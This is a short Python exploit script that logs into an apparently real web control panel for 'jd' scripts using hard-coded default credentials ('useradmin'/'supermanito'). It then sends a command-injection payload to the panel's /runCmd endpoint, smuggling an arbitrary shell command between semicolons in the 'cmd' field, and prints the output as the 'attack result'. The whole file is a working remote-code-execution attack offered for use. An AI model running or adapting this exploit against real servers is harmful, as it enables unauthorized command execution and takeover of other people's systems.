import requests
import argparse


def loginJdAndEXP(url,username,password,cmd):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    req=requests.session()
    #req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}

    data={
        "username":username,
        "password":password
    }

    resp=req.post(url+"/auth",data)
    if resp.status_code==200:
        if "\"err\":0" in resp.text:
            print("登录成功")
    data2="cmd=bash+jd.sh+%3B{0}%3B+now&delay=500".format(cmd)
    # data2={
    #     "cmd":"bash+jd.sh+%3B{0}%3B+now".format(cmd),
    #     "delay":"500"
    # }

    resp2=req.post(url+"/runCmd",data2,headers=headers)
    if resp2.status_code==200:
        #soup=BeautifulSoup(resp2.content, 'html.parser', from_encoding='utf-8')

        print("------------------------------------------")
        result=resp2.json()['msg'][resp2.json()['msg'].find("jd_zoo.js")+10:]
        print("攻击结果："+result)


if __name__=='__main__':
    parse=argparse.ArgumentParser()
    parse.add_argument("url",type=str)
    parse.add_argument("-u","--user",type=str)
    parse.add_argument("-p","--pwd",type=str)
    parse.add_argument("-c","--cmd",type=str)

    arguments=parse.parse_args()
    url=arguments.url

    if arguments.user:
        username=arguments.user
    else:
        username="useradmin"

    if arguments.pwd:
        password=arguments.pwd
    else:
        password="supermanito"

    if arguments.cmd:
        cmd=arguments.cmd
    else:
        cmd="id"

    loginJdAndEXP(url,username,password,cmd)

